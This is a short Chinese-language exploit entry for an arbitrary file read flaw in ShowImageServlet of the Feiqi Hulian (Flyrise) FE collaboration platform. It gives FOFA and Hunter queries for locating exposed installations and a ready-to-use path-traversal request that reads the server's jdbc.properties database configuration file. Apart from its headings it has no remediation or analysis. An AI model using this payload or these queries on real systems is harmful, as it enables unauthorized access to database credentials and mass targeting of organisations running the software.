# 飞企互联 FE业务协作平台 ShowImageServlet 任意文件读取漏洞

## 网络测绘

fofa: app="FE-协作平台 || "flyrise.stopBackspace.js"

hunter: app.name="飞企互联 FE"

## POC / EXP

```
/servlet/ShowImageServlet?imagePath=../web/fe.war/WEB-INF/classes/jdbc.properties&print
```